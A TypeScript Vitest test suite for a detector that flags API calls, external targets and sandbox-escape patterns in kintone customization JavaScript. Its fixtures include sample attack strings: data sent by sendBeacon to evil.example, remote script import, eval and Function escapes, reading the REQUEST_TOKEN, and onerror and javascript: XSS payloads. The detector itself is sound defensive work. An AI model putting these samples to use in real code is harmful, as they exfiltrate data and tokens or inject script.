import { describe, expect, test } from 'vitest';
import { detectJsCapabilityUsage, unquoteLiteral } from './capability-detector';

const bypassPatterns = (code: string) =>
  detectJsCapabilityUsage(code).bypass.map((entry) => entry.pattern);

describe('unquoteLiteral', () => {
  test.each([
    ["'PUT'", 'PUT'],
    ['"PUT"', 'PUT'],
    ['`PUT`', 'PUT'],
    ["'P\\UT'", null],
    ["'unclosed", null],
    ['PUT', null],
  ])('%s -> %s', (raw, expected) => {
    expect(unquoteLiteral(raw)).toBe(expected);
  });
});

describe('detectJsCapabilityUsage: kintone.api', () => {
  test('メソッドとパスのリテラルと行番号を返す', () => {
    const code = [
      "kintone.events.on('app.record.edit.submit', async (event) => {",
      "  await kintone.api(kintone.api.url('/k/v1/record.json', true), 'PUT', {",
      '    app: 1,',
      '  });',
      "  await kintone.api('/k/v1/records.json', 'get', { app: 1 });",
      '});',
    ].join('\n');
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([
      { method: 'PUT', path: '/k/v1/record.json', line: 2 },
      { method: 'GET', path: '/k/v1/records.json', line: 5 },
    ]);
  });

  test('オプショナルチェイニングの呼び出しも数える', () => {
    const code = [
      "kintone?.api('/k/v1/record.json', 'PUT', {});",
      "kintone.api?.('/k/v1/records.json', 'DELETE', {});",
      "kintone?.proxy?.('https://api.example.com/v1/', 'GET', {}, {});",
    ].join('\n');
    const usage = detectJsCapabilityUsage(code);
    expect(usage.apiCalls).toEqual([
      { method: 'PUT', path: '/k/v1/record.json', line: 1 },
      { method: 'DELETE', path: '/k/v1/records.json', line: 2 },
    ]);
    expect(usage.external).toEqual([{ target: 'https://api.example.com/v1/', line: 3 }]);
  });

  test('メソッドが変数なら unknown', () => {
    const code = "const method = 'DELETE';\nkintone.api('/k/v1/records.json', method, {});";
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([
      { method: 'unknown', path: '/k/v1/records.json', line: 2 },
    ]);
  });

  test('kintone.api.url だけの呼び出しは api 呼び出しに数えない', () => {
    expect(detectJsCapabilityUsage("kintone.api.url('/k/v1/record.json')").apiCalls).toEqual([]);
  });

  test('コメントと文字列の中は数えない', () => {
    const code =
      "// kintone.api('/k/v1/record.json', 'PUT', {})\nconst s = \"kintone.api('x', 'DELETE')\";";
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([]);
  });

  test('テンプレートリテラルの中の呼び出しも数える', () => {
    // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
    const code = "const s = `${await kintone.api('/k/v1/record.json', 'POST', {})}`;";
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([
      { method: 'POST', path: '/k/v1/record.json', line: 1 },
    ]);
  });
});

describe('detectJsCapabilityUsage: kintone.proxy', () => {
  test('送信先のリテラルを返す', () => {
    const code = [
      "kintone.proxy('https://api.example.com/v1/zip', 'GET', {}, {});",
      "kintone.proxy.upload('https://files.example.com/up', 'POST', {}, {});",
      // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
      "kintone.proxy(`https://api.example.com/v1/${id}`, 'GET', {}, {});",
    ].join('\n');
    expect(detectJsCapabilityUsage(code).external).toEqual([
      { target: 'https://api.example.com/v1/zip', line: 1 },
      { target: 'https://files.example.com/up', line: 2 },
      { target: null, line: 3 },
    ]);
  });
});

describe('detectJsCapabilityUsage: 迂回パターン', () => {
  test.each([
    ["window.kintone.api('/k/v1/record.json', 'PUT', {})", '.kintone'],
    ["globalThis.kintone.api('/k/v1/record.json', 'PUT', {})", 'globalThis'],
    ["window['kin' + 'tone']", 'window[...]'],
    ["self['kintone']", 'self[...]'],
    ['const w = window;', 'window'],
    ["fetch('/k/v1/record.json', { method: 'PUT' })", 'fetch'],
    ["window.fetch('/x')", 'fetch'],
    ['new XMLHttpRequest()', 'XMLHttpRequest'],
    ["navigator.sendBeacon('https://evil.example', data)", 'sendBeacon'],
    ["new WebSocket('wss://evil.example')", 'WebSocket'],
    ["eval('1')", 'eval'],
    ["(0, eval)('1')", 'eval'],
    ["new Function('return this')()", 'Function'],
    ["Function('return this')()", 'Function'],
    ["(() => {}).constructor('return this')()", '.constructor'],
    ["import('https://evil.example/x.js')", 'import()'],
    ['cybozu.data.REQUEST_TOKEN', 'cybozu'],
    ["setTimeout('alert(1)', 0)", 'setTimeout(string)'],
    ["document.createElement('script')", "createElement('script')"],
    ["document.createElement('IFRAME')", "createElement('iframe')"],
    ['frame.contentWindow.kintone', 'contentWindow'],
    ['document.defaultView.kintone', 'defaultView'],
    ["el.innerHTML = '<iframe src=x>'", 'string:<\\s*iframe'],
    ["a.href = 'javascript:alert(1)'", 'string:javascript:'],
    [
      `el.innerHTML = '<a href="javascript:void(0)">x</a><a href="javascript:run()">y</a>'`,
      'string:javascript:',
    ],
    ['\\u0066etch("/x")', 'escaped-identifier'],
    ["const g = self; g['kin' + 'tone'].api('/k/v1/records.json', 'DELETE', {});", 'self'],
    ['const g = top;', 'top'],
    ['use(parent);', 'parent'],
    ['const f = frames;', 'frames'],
    ['const o = opener;', 'opener'],
    ["el.innerHTML = '<img src=x onerror=alert(1)>'", 'string:on*='],
    ['el.innerHTML = `<div onclick="run()">x</div>`', 'string:on*='],
    ["document.write('<p>x</p>')", 'document.write'],
    ["document.writeln('<p>x</p>')", 'document.write'],
    // テンプレート・連結で属性が分かれていても、組み立て後の文字列で判定する
    // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
    ['el.innerHTML = `<img src="${url}" onerror="${payload}">`;', 'string:on*='],
    ["el.innerHTML = '<img src=\"' + url + '\" onerror=\"' + payload + '\">';", 'string:on*='],
    ['el.innerHTML = \'<img title="a>b" onerror="run()">\';', 'string:on*='],
    // 別の関数やブロックでの宣言は、外側の参照を隠さない
    [
      'function widget() { var self = this; self.value = 1; }\nfunction leak() { const g = self; }',
      'self',
    ],
    ['{ const top = 1; }\nconst g = top;', 'top'],
    // 分割代入の既定値やキーは宣言ではない
    ['const { a = self } = x; use(a);', 'self'],
    ['const { top: t } = x; use(top);', 'top'],
    // 計算プロパティのキーは式であり、宣言ではない
    ["const { [self]: x } = obj; x['kin' + 'tone'];", 'self'],
    ['function f({ [top]: x }) { return x; }', 'top'],
    // 別の関数の var は巻き上がらない
    ["function a() { var self = this; }\nfunction b() { self['kin' + 'tone']; }", 'self[...]'],
  ])('%s -> %s', (code, pattern) => {
    expect(bypassPatterns(code)).toContain(pattern);
  });

  test.each([
    'element.style.top = "10px";',
    'const parent = el.parentElement; parent.appendChild(child);',
    'const rect = el.getBoundingClientRect(); rect.top;',
    'var self = this; self.value = 1;',
    'window.addEventListener("resize", handler);',
    'window.location.href;',
    'class Foo { constructor(a) { this.a = a; } }',
    'if (value instanceof Function) {}',
    '// fetch("/x") はコメント',
    'const text = "fetch(url) で取得します";',
    'setTimeout(() => render(), 0);',
    "document.createElement('div');",
    "kintone.events.on('app.record.detail.show', (event) => event);",
    "kintone.api('/k/v1/record.json', 'GET', { app: 1, id: 1 });",
    "kintone.app.record.setFieldShown('Amount', false);",
    'const re = /fetch\\(/g;',
    "a.href = 'javascript:void(0)';",
    'a.href = "javascript:;";',
    `el.innerHTML = '<a href="javascript:void(0)">詳細</a>';`,
    "a.setAttribute('href', 'javascript: void 0');",
    // 同じ名前をコード内で宣言していれば、グローバルではなくその変数とみなす
    'const top = rect.top; const y = top + 1;',
    'let parent = node; while (parent) { parent = parent.parentNode; }',
    'const style = { top: 0, parent: 1 };',
    "el.textContent = 'onerror=は属性名です';",
    'el.innerHTML = \'<button type="button">online</button>\';',
    'const writer = { write: () => {} }; writer.write();',
    // 引数として宣言された名前は、その関数の中ではその引数
    'const obj = { render(self) { const g = self; g.doSomething(); } };',
    'class Tree { attach(parent) { const g = parent; g.append(node); } }',
    'function f(top) { return use(top); }',
    'const f = (parent) => use(parent);',
    'items.map(self => render(self));',
    'try { run(); } catch (parent) { report(parent); }',
    // 同名の変数への計算プロパティは、その変数への参照
    "const self = this; self['value'] = 1;",
    "function f(parent) { return parent['children']; }",
    // var は関数全体へ巻き上がる(ブロックの外・宣言より前の参照もその変数)
    'function run() { if (ok) { var self = this; } const g = self; g.doThing(); }',
    'function run() { use(top); var top = 1; }',
    // 分割代入で宣言した名前も、その変数
    'function f({ self }) { return use(self); }',
    'const { self } = config; use(self);',
    'const [top] = list; use(top);',
    'const { a: { parent }, b: [frames] } = x; use(parent, frames);',
    'const { value: opener = 1 } = x; use(opener);',
    'try { run(); } catch ({ self }) { use(self); }',
    'items.map(([top, parent]) => use(top, parent));',
  ])('誤検知しない: %s', (code) => {
    expect(bypassPatterns(code)).toEqual([]);
  });
});

describe('detectJsCapabilityUsage: 外部URLのリテラル', () => {
  test('http(s) と // で始まる文字列を集める', () => {
    const code = [
      "const doc = 'https://example.com/help';",
      "const cdn = '//cdn.example.com/a.png';",
      "const path = '/k/v1/record.json';",
    ].join('\n');
    expect(detectJsCapabilityUsage(code).urlLiterals).toEqual([
      { url: 'https://example.com/help', line: 1 },
      { url: '//cdn.example.com/a.png', line: 2 },
    ]);
  });
});

describe('detectJsCapabilityUsage: 外部リソースの読み込み', () => {
  const resources = (code: string) => detectJsCapabilityUsage(code).resources;

  test.each([
    ["img.src = 'https://img.example.com/a.png';", 'https://img.example.com/a.png'],
    ["video.poster = '//cdn.example.com/p.png';", '//cdn.example.com/p.png'],
    ["el.setAttribute('src', 'https://cdn.example.com/a.js');", 'https://cdn.example.com/a.js'],
    [
      "el.setAttribute('srcset', 'https://img.example.com/a.png 2x');",
      'https://img.example.com/a.png',
    ],
    [
      'el.innerHTML = \'<img src="https://img.example.com/a.png">\';',
      'https://img.example.com/a.png',
    ],
    [
      "el.innerHTML = '<form action=https://api.example.com/post>';",
      'https://api.example.com/post',
    ],
    [
      'el.style.backgroundImage = \'url("https://img.example.com/b.png")\';',
      'https://img.example.com/b.png',
    ],
  ])('リテラルの送信先を返す: %s', (code, target) => {
    expect(resources(code)).toEqual([{ target, line: 1 }]);
  });

  test.each([
    "img.src = 'https://x.example/?d=' + data;",
    // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
    'img.src = `https://x.example/${id}`;',
  ])('組み立てた送信先は判定できない(null): %s', (code) => {
    expect(resources(code)).toEqual([{ target: null, line: 1 }]);
  });

  test.each([
    "a.href = 'https://example.com/help';",
    "img.src = '/k/api/blob/download.do?fileKey=' + key;",
    'img.src = url;',
    "const url = 'https://example.com/api';",
    "el.textContent = 'src=https://example.com/a.png';",
    'el.innerHTML = \'<a href="https://example.com/help">help</a>\';',
    "// img.src = 'https://img.example.com/a.png';",
    // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
    'el.innerHTML = `<img src="${url}">`;',
  ])('読み込みでないものは数えない: %s', (code) => {
    expect(resources(code)).toEqual([]);
  });

  test.each([
    ["img['src'] = 'https://img.example.com/a.png';", 'https://img.example.com/a.png'],
    [
      'el.innerHTML = \'<img title="a>b" src="https://img.example.com/x.png">\';',
      'https://img.example.com/x.png',
    ],
  ])('計算プロパティ・引用符内の > があっても読み取る: %s', (code, target) => {
    expect(resources(code)).toEqual([{ target, line: 1 }]);
  });

  test.each([
    "img.src += 'https://evil.example/x.js';",
    // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
    'el.innerHTML = `<img src="https://img.example.com/${id}.png">`;',
    "el.innerHTML = '<img src=\"https://img.example.com/' + id + '.png\">';",
  ])('複合代入・組み立てたHTMLの送信先は判定できない(null): %s', (code) => {
    expect(resources(code)).toEqual([{ target: null, line: 1 }]);
  });
});

describe('detectJsCapabilityUsage: 所要時間', () => {
  const depth = 12 * 1024;
  // 以前の実装は括弧や呼び出しごとに内側を走査し直し、同じ規模の入力で5秒前後かかった
  test.each([
    ['入れ子の呼び出し', `${'f('.repeat(depth)}${')'.repeat(depth)};`],
    ['入れ子の setAttribute', `${'el.setAttribute('.repeat(depth)}'src'${')'.repeat(depth)};`],
    ['入れ子の連結', `${"'a' + f(".repeat(depth)}'x'${')'.repeat(depth)};`],
    ['入れ子のブロックでの別名の参照', `${'{ use(self); '.repeat(depth)}${'}'.repeat(depth)}`],
    ['入れ子の分割代入', `const ${'{ a: '.repeat(depth)}self${' }'.repeat(depth)} = x; use(self);`],
    [
      'トップレベルの宣言',
      Array.from({ length: 20_000 }, (_, index) => `var v${index};`).join('\n'),
    ],
  ])('%sが深くても、線形時間で終わる', (_, code) => {
    const startedAt = performance.now();
    detectJsCapabilityUsage(code);
    expect(performance.now() - startedAt).toBeLessThan(1500);
  });
});

describe('detectJsCapabilityUsage: 行番号', () => {
  test('複数行のコメント・テンプレートをまたいでも行番号がずれない', () => {
    const code = ['/*', ' * 説明', ' */', 'const s = `a', 'b`;', 'fetch("/x");'].join('\n');
    expect(detectJsCapabilityUsage(code).bypass).toEqual([{ pattern: 'fetch', line: 6 }]);
  });
});
